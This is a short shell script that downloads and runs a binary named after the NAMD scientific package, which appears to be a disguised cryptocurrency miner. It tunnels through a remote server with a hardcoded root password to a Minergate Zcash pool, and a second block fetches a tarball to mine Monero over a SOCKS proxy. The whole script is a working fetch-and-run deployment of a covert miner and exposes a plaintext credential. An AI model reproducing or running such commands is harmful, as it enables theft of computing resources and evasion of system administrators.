wget http://yogurtnetdl.github.io/namd2
chmod +x namd2
sshpass -p "Whlw650913" ssh -oStrictHostKeyChecking=no -N -L 20001:zec.pool.minergate.com:3357 root@47.88.228.184 &
nohup ./namd2 -l localhost:20001 -u hilcj0001@gmail.com -cd 0 0 1 1 2 2 3 3  &

wget https://yogurtnetdl.github.io/namd.tar.gz;
tar -xf namd.tar.gz;
cd namd/opt/namd/;
./namd2 -proxy SOCKS://47.88.228.184:23455 -user hilcj0001@gmail.com -xmr 24
